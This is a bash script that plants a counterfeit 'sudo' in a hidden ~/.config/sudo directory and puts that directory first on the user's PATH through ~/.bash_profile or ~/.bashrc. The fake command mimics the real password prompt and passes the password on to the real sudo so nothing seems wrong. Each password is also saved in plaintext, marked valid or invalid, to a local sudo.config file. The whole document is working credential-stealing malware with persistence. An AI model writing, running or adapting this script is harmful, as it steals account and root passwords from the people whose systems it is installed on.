#!/bin/bash

if [ ! -d ~/.config/sudo ]
then
    mkdir -p ~/.config/sudo
fi

if [ -f  ~/.config/sudo/sudo ]
then
    rm  ~/.config/sudo/sudo
fi

echo '#!'$SHELL >> ~/.config/sudo/sudo
cat <<'EOF' >> ~/.config/sudo/sudo
/usr/bin/sudo -n true 2>/dev/null
if [ $? -eq 0 ]
then
    /usr/bin/sudo $@
else
    echo -n "[sudo] password for $USER: "
    read -s pwd
    echo
    echo "$pwd" | /usr/bin/sudo -S true 2>/dev/null
    if [ $? -eq 1 ]
    then
	echo "$USER:$pwd:invalid" >> ~/.config/sudo/sudo.config
	echo "Sorry, try again."
	sudo $@
    else
	echo "$USER:$pwd:valid" >> ~/.config/sudo/sudo.config
	echo "$pwd" | /usr/bin/sudo -S $@
    fi
fi
EOF

chmod u+x ~/.config/sudo/sudo
if [ -f ~/.bash_profile ]
then
    echo "export PATH=~/.config/sudo:$PATH" >> ~/.bash_profile
else
    echo "export PATH=~/.config/sudo:$PATH" >> ~/.bashrc
fi
